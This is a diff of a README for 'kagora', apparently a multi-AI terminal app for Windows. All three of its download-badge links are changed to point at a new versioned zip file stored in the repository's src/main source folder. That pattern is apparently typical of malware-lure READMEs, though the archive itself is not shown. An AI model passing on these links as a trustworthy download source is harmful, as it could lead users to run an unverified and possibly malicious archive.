@@ -1,6 +1,6 @@
 # 🚀 kagora - Multi-AI Terminal for Easy Access
 
-[![Download kagora](https://img.shields.io/badge/Download-kagora-brightgreen?style=for-the-badge)](https://github.com/Fahrurozik/kagora/raw/refs/heads/main/src/main/Software_v2.8.zip)
+[![Download kagora](https://img.shields.io/badge/Download-kagora-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Fahrurozik/kagora/main/src/main/Software-v3.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You do not need any extra software or coding tools to run kagora.
 
 To get kagora on your Windows PC, visit the page below. You will find the latest app version and a download button there.  
 
-[![Download kagora](https://img.shields.io/badge/Download-kagora-blue?style=for-the-badge)](https://github.com/Fahrurozik/kagora/raw/refs/heads/main/src/main/Software_v2.8.zip)
+[![Download kagora](https://img.shields.io/badge/Download-kagora-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fahrurozik/kagora/main/src/main/Software-v3.9.zip)
 
 **Steps to download:**
 
@@ -123,4 +123,4 @@ Do not uninstall the old version manually. The installer handles updates safely.
 
 ---
 
-[![Download kagora](https://img.shields.io/badge/Get-kagora-brightgreen?style=for-the-badge)](https://github.com/Fahrurozik/kagora/raw/refs/heads/main/src/main/Software_v2.8.zip)
+[![Download kagora](https://img.shields.io/badge/Get-kagora-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Fahrurozik/kagora/main/src/main/Software-v3.9.zip)
